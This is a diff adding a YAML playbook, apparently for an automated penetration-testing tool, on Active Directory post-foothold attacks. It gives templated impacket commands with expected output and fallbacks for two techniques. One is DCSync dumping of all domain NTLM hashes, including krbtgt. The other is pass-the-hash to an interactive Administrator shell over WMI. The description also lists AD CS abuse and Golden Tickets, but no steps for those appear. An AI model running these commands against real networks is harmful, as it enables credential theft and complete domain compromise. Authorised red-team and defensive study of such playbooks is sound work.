@@ -1,0 +1,48 @@
+id: ad-attacks
+name: Active Directory Lateral Movement & Dominance
+category: ad
+description: Methodology for Active Directory post-foothold attacks. Covers DCSync NTDS password dumping, Pass-the-Hash, AD CS certificate template abuse, and Golden Tickets.
+port_triggers:
+  - 88
+  - 389
+  - 445
+service_triggers:
+  - kerberos
+  - ldap
+  - smb
+tags:
+  - active-directory
+  - dcsync
+  - pass-the-hash
+  - adcs
+  - kerberos
+steps:
+  - id: ad-dcsync-dump
+    title: DCSync Domain NTDS Password Hash Extraction
+    phase: privesc
+    purpose: Impersonate a Domain Controller using DS-Replication permissions to dump all user NTLM hashes directly from Active Directory.
+    command: impacket-secretsdump '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET}}' -just-dc-ntlm
+    expected_output:
+      - 'Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::'
+      - 'krbtgt:502:aad3b435...:284d728d84a7e91...:::'
+    common_mistakes:
+      - User must have `Replicating Directory Changes` rights (Domain Admins, Enterprise Admins, or delegated sync accounts).
+    if_success: Domain-wide compromise! Captured Administrator and krbtgt NTLM hashes.
+    if_failure: Insufficient replication privileges. Check BloodHound for ACL abuse paths to Domain Admin.
+    references:
+      - https://wadcoms.github.io/
+  - id: ad-pass-the-hash
+    title: Pass-the-Hash Remote Command Execution
+    phase: privesc
+    purpose: Execute commands on any domain host using an extracted NTLM password hash without cracking the cleartext password.
+    command: impacket-wmiexec -hashes ':{{HASH}}' '{{DOMAIN|corp.local}}/{{USERNAME|Administrator}}@{{TARGET}}'
+    expected_output:
+      - '[*] SMBv2.1 dialect used'
+      - '[*] Authenticating as {{DOMAIN}}\Administrator...'
+      - C:\Windows\system32>
+    common_mistakes:
+      - 'Passing the LM hash; place a colon before the 32-character NTLM hash: `-hashes :31d6cfe...`.'
+    if_success: Interactive Administrator shell spawned over WMI!
+    if_failure: WMI blocked. Try `impacket-psexec` or `evil-winrm -H {{HASH}}`.
+    references:
+      - https://wadcoms.github.io/
